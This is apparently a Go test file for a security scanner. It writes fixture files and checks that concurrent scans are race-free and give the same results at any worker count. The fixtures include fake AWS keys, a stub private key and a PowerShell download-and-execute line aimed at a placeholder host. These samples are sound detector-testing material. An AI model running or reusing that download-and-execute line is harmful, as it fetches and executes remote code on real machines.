package checks

import (
	"context"
	"fmt"
	"os"
	"path/filepath"
	"sync"
	"testing"

	"starkscan/internal/finding"
	"starkscan/internal/scan"
	"starkscan/internal/scope"
)

// buildTree writes a varied set of files so the walk touches every code path:
// text and binary, secrets and clean content, scripts, keys, and archives.
func buildTree(t *testing.T, files int) string {
	t.Helper()
	root := t.TempDir()

	for i := 0; i < files; i++ {
		dir := filepath.Join(root, fmt.Sprintf("d%d", i%8))
		if err := os.MkdirAll(dir, 0o755); err != nil {
			t.Fatal(err)
		}

		var name string
		var body []byte
		switch i % 6 {
		case 0:
			name, body = fmt.Sprintf("cfg%d.yml", i),
				[]byte(fmt.Sprintf("key: AKIA2E0KZ9XQ4TRVBN%02d\nother: value\n", i%100))
		case 1:
			name, body = fmt.Sprintf("blob%d.bin", i), append([]byte{0x00, 0x01, 0x02}, make([]byte, 256)...)
		case 2:
			name, body = fmt.Sprintf("run%d.ps1", i),
				[]byte("$c = New-Object Net.WebClient\nIEX $c.DownloadString('http://h/x')\n")
		case 3:
			name, body = fmt.Sprintf("id%d.pem", i), []byte("-----BEGIN RSA PRIVATE KEY-----\nAAAA\n")
		case 4:
			name, body = fmt.Sprintf("notes%d.md", i),
				[]byte("# heading\n\nordinary prose with no findings at all.\n")
		default:
			name, body = fmt.Sprintf("exe%d.txt", i), append([]byte("MZ\x90\x00"), make([]byte, 64)...)
		}

		if err := os.WriteFile(filepath.Join(dir, name), body, 0o600); err != nil {
			t.Fatal(err)
		}
	}
	return root
}

// runScan drives the real walker with the real check set, exactly as the CLI
// does. This is the code path the race detector needs to see: one shared Scope
// and one shared instance of each check, used from every worker goroutine at
// once, with each File's cached OS queries resolved concurrently.
func runScan(t *testing.T, root string, workers int) []finding.Finding {
	t.Helper()

	sc, err := scope.New([]string{root})
	if err != nil {
		t.Fatal(err)
	}
	active := NewRegistry(Config{
		HashList: map[string]string{
			"0000000000000000000000000000000000000000000000000000000000000000": "unused entry",
		},
	}).All()

	var (
		mu    sync.Mutex
		found []finding.Finding
	)
	emit := func(f finding.Finding) {
		mu.Lock()
		found = append(found, f)
		mu.Unlock()
	}

	w := &scan.Walker{
		Scope: sc,
		Opts:  scan.Options{Workers: workers, MaxFileSize: 1 << 20},
		OnBlocked: func(display, target string) {
			emit(finding.Finding{RuleID: "SCOPE01", Path: display})
		},
		OnOversize: func(display string, size int64) {
			emit(finding.Finding{RuleID: "SCAN01", Path: display})
		},
	}

	ctx := context.Background()
	stats, err := w.Run(ctx, func(f *scan.File) {
		for _, c := range active {
			c.Inspect(ctx, f, emit)
			// Touch every cached accessor from the worker goroutine, so a
			// broken sync.Once shows up as a race rather than as flaky output.
			_ = f.Perm()
			_ = f.Streams()
			_ = f.LineAt(3)
			_ = f.IsBinary()
		}
	})
	if err != nil {
		t.Fatal(err)
	}
	if stats.Files == 0 {
		t.Fatal("walk visited no files")
	}
	return found
}

// TestConcurrentScanIsRaceFree exercises the worker pool under -race.
func TestConcurrentScanIsRaceFree(t *testing.T) {
	root := buildTree(t, 240)
	got := runScan(t, root, 16)
	if len(got) == 0 {
		t.Fatal("expected findings from the generated tree")
	}
}

// TestScanResultIsDeterministicAcrossWorkerCounts checks that concurrency
// changes only the order of work, never its outcome. A count that shifts with
// the worker count would mean shared state was leaking between files.
func TestScanResultIsDeterministicAcrossWorkerCounts(t *testing.T) {
	root := buildTree(t, 120)

	tally := func(fs []finding.Finding) map[string]int {
		m := map[string]int{}
		for _, f := range fs {
			m[f.RuleID]++
		}
		return m
	}

	base := tally(runScan(t, root, 1))
	for _, workers := range []int{2, 8, 32} {
		got := tally(runScan(t, root, workers))
		if len(got) != len(base) {
			t.Fatalf("workers=%d produced %d distinct rules, want %d", workers, len(got), len(base))
		}
		for rule, n := range base {
			if got[rule] != n {
				t.Errorf("workers=%d: rule %s fired %d times, want %d", workers, rule, got[rule], n)
			}
		}
	}
}
